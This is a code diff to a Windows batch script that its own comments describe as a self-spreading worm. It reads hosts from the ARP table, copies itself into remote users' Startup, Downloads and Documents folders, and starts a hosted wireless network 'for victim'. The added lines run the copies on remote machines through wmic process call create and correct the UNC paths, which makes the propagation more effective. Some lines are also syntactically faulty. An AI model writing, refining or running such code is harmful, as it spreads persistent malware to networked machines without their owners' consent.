@@ -46,18 +46,17 @@ REM Copies itself to them.
 REM else goto loop
 goto :loop
 :nview
-for /f "tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
-copy /y %0 "%%i\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
+for /f "delims=\\ tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
+copy /y %0 "\\%%i\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup"
 call :Fcheck
-copy /y %0 "%%i\"
+copy /y %0 "\\%%i\"
 )
 
 :Fcheck
 if exist %%i\Movies do copy /y %0 %%i\Movies
-if exist %%i\Downloads do copy /y %0 %%i\Downloads
-if exist %%i\Documents do copy /y %0 %%i\Documents
+if exist %%i\Downloads do copy /y %0 %%i\Downloads && wmic /node:%%i process call create "cmd.exe %USERPROFILE%\Downloads\w3e.bat" >nul
+if exist %%i\Documents do copy /y %0 %%i\Documents && wmic /node:%%i process call create "cmd.exe %USERPROFILE%\Documents\w3e.bat" >nul
 copy /y %0 "%%i\Users\Public\Documents"
-goto :eof
 
 REM Now it then try to run its copies on the remote machine 
 for /f "delims=\\ tokens=1" %%i in (%USERPROFILE%\Downloads\netv.tmp) do (
@@ -72,7 +71,7 @@ REM If there are still no network it then start its own
 REM network for other PC to connect.
 :loop
 del  /f /q IP.txt
-arp -a | findstr "dynamic" >> %USERPROFILE%\Downloads\IP.txt && goto PLB
+arp -a ^| findstr "dynamic" >> %USERPROFILE%\Downloads\IP.txt && goto PLB
 rem if no network found then start own network for victim
 netsh wlan start hostednetwork >nul
 goto loop
